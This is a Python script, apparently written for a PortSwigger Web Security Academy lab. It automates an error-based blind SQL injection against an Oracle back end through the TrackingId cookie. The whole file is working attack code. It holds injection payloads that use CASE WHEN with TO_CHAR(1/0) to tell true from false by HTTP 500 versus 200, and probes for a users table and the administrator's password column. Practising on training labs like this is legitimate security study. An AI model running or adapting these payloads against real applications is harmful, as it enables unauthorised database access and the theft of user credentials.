import asyncio
import aiohttp

BASE_URL = "https://0a2d0071033fa28880e0622f006500ac.web-security-academy.net"

async def test_oracle_syntax():
    """測試 Oracle 特定的語法問題"""
    
    test_cases = [
        # 基本測試
        ("Basic true", "'a'='a'"),
        ("Basic false", "'a'='b'"),
        
        # SUBSTR 不同寫法
        ("SUBSTR standard", "SUBSTR('aaa',1,1)='a'"),
        ("SUBSTR with dual", "SUBSTR((SELECT 'aaa' FROM dual),1,1)='a'"),
        ("SUBSTR cast", "SUBSTR(CAST('aaa' AS VARCHAR2(10)),1,1)='a'"),
        
        # 替代方案
        ("INSTR function", "INSTR('aaa','a')=1"),
        ("LENGTH comparison", "LENGTH('a')=1"),
        
        # 檢查是否能存取 users 表
        ("Table exists", "(SELECT COUNT(*) FROM users WHERE username='administrator')>0"),
        ("Column exists", "(SELECT COUNT(password) FROM users WHERE username='administrator')>0"),
        
        # 不同的錯誤觸發方法
        ("Division error alt", "1/(CASE WHEN 'a'='a' THEN 0 ELSE 1 END)=1"),
    ]
    
    async with aiohttp.ClientSession() as session:
        for name, condition in test_cases:
            # 先測試 True 條件（應該回傳 500）
            payload_true = f"'||(SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
            status_true = await test_payload(session, payload_true)
            
            # 再測試相對的 False 條件（應該回傳 200）
            false_condition = condition.replace('=', '!=', 1) if '=' in condition else condition.replace('>', '<', 1)
            payload_false = f"'||(SELECT CASE WHEN ({false_condition}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
            status_false = await test_payload(session, payload_false)
            
            result = "✅" if status_true == 500 and status_false == 200 else "❌"
            print(f"{result} {name}: True={status_true}, False={status_false}")
            await asyncio.sleep(0.1)

async def test_payload(session: aiohttp.ClientSession, payload: str) -> int:
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    params = {"category": "Gifts"}
    
    try:
        async with session.get(BASE_URL, cookies=cookies, params=params, timeout=10, allow_redirects=False) as resp:
            return resp.status
    except Exception as e:
        return 0

if __name__ == "__main__":
    asyncio.run(test_oracle_syntax())